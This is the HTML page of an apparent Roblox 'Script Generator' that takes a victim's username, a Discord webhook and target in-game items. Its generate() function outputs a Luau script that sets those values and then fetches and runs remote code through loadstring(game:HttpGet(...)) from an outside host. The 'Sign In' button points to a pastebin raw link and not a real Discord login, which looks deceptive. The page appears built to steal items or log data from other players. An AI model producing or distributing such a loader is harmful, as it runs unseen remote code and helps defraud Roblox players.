<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Script Generator</title>
  <style>
    /* RED THEME SYSTEM */
    :root {
      --primary-red: #ff0000;
      --dark-red: #8b0000;
      --bg-black: #050505;
      --card-bg: #0a0a0a;
      --border-gray: rgba(255, 0, 0, 0.2);
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
      min-height: 100vh; 
      font-family: 'Inter', sans-serif; 
      color: #f1f5f9; 
      background: var(--bg-black); 
      display: flex; 
      flex-direction: column; 
    }

    nav { 
      display: flex; 
      align-items: center; 
      justify-content: space-between; 
      padding: 1rem 1.5rem; 
      border-bottom: 1px solid var(--border-gray); 
      background: rgba(0,0,0,0.8); 
    }
    
    .logo { 
      font-size: 1.1rem; 
      font-weight: 800; 
      color: var(--primary-red);
      cursor: pointer; 
      display: flex; 
      align-items: center; 
      gap: 5px;
    }
    
    .nav-link { color: #999; font-size: 0.875rem; cursor: pointer; text-decoration: none; transition: 0.3s; }
    .nav-link:hover { color: var(--primary-red); }

    .btn-discord { 
      background: #5865F2; 
      color: #fff; 
      font-size: 0.875rem; 
      font-weight: 600; 
      padding: 0.5rem 1rem; 
      border-radius: 0.5rem; 
      text-decoration: none;
      transition: 0.3s;
    }
    .btn-discord:hover { background: #4752c4; }

    main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 2.5rem 1rem; }
    .container { width: 100%; max-width: 640px; display: flex; flex-direction: column; gap: 1.5rem; }
    
    h1 { text-align: center; font-size: 2.5rem; font-weight: 800; color: #fff; }
    .subtitle { text-align: center; color: #666; font-size: 0.9rem; margin-top: -10px; }
    
    .status-pill {
      background: rgba(255, 0, 0, 0.1);
      border: 1px solid var(--primary-red);
      color: var(--primary-red);
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 0.7rem;
      width: fit-content;
      margin: 0 auto 10px auto;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .card { 
      background: var(--card-bg); 
      border: 1px solid var(--border-gray); 
      border-radius: 1rem; 
      padding: 2rem; 
      display: flex; 
      flex-direction: column; 
      gap: 1.25rem; 
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.05);
    }

    label { font-size: 0.75rem; font-weight: 700; color: #666; text-transform: uppercase; margin-bottom: 0.5rem; }
    
    input, textarea { 
      width: 100%; 
      background: #111; 
      border: 1px solid #222; 
      border-radius: 0.5rem; 
      padding: 0.8rem 1rem; 
      font-size: 0.875rem; 
      color: #fff; 
      outline: none; 
      transition: 0.2s;
    }
    input:focus { border-color: var(--primary-red); box-shadow: 0 0 10px rgba(255, 0, 0, 0.1); }

    .btn-generate { 
      background: #151515; 
      color: #fff; 
      font-weight: 700; 
      padding: 1rem; 
      border: 1px solid #222; 
      border-radius: 0.5rem; 
      cursor: pointer; 
      transition: 0.3s; 
    }
    .btn-generate:hover { border-color: var(--primary-red); color: var(--primary-red); }

    pre { 
      font-size: 0.75rem; 
      color: var(--primary-red); 
      background: #000; 
      border: 1px solid #222; 
      padding: 1rem; 
      border-radius: 0.5rem; 
      overflow-x: auto; 
    }
  </style>
</head>
<body>

<nav>
  <div class="nav-left">
    <span class="logo" onclick="showPage('home')">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M13 10V3L4 14H11V21L20 10H13Z"/></svg>
      Morreira
    </span>
    <a class="nav-link" onclick="showPage('home')">Generator</a>
    <a class="nav-link" onclick="showPage('leaderboard')">Global Logs</a>
  </div>
  <div class="nav-right" id="nav-right">
    <a class="btn-discord" href="https://pastebin.com/raw/RW8xuBEE/api/auth/discord">Sign In</a>
  </div>
</nav>

<main>
  <div id="page-home" class="container">
    <div class="status-pill">● Working</div>
    <h1>Script Generator</h1>
    <p class="subtitle">Generate LUAU scripts for your targets</p>
    
    <div class="card">
      <div>
        <label>Roblox Username</label>
        <input id="username" type="text" placeholder="Enter Roblox username" onkeydown="if(event.key==='Enter')lookup()" />
      </div>
      <div>
        <label>Discord Webhook (Optional)</label>
        <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/..." />
      </div>
      <div>
        <label>Target Brainrots</label>
        <textarea id="brainrots" rows="4" placeholder="Select brainrots..."></textarea>
      </div>
      <button class="btn-generate" onclick="generate()">Sign in to Generate</button>
    </div>

    <div class="card" id="output-card" style="display:none; border-color: var(--primary-red);">
      <pre id="script-output"></pre>
    </div>
  </div>
</main>

<script>
  const API = 'https://pastebin.com/raw/RW8xuBEE';
  
  async function generate() {
    const webhook = document.getElementById('webhook').value;
    const user = document.getElementById('username').value;
    const raw = document.getElementById('brainrots').value;
    
    const script = `-- Generated Script\ngetgenv().Username = "${user}"\ngetgenv().Webhook = "${webhook}"\nloadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/download"))()`;
    
    document.getElementById('script-output').textContent = script;
    document.getElementById('output-card').style.display = 'flex';
  }

  function showPage(page) {
    // Basic page switching logic
    alert("Switching to " + page);
  }
</script>
</body>
</html>
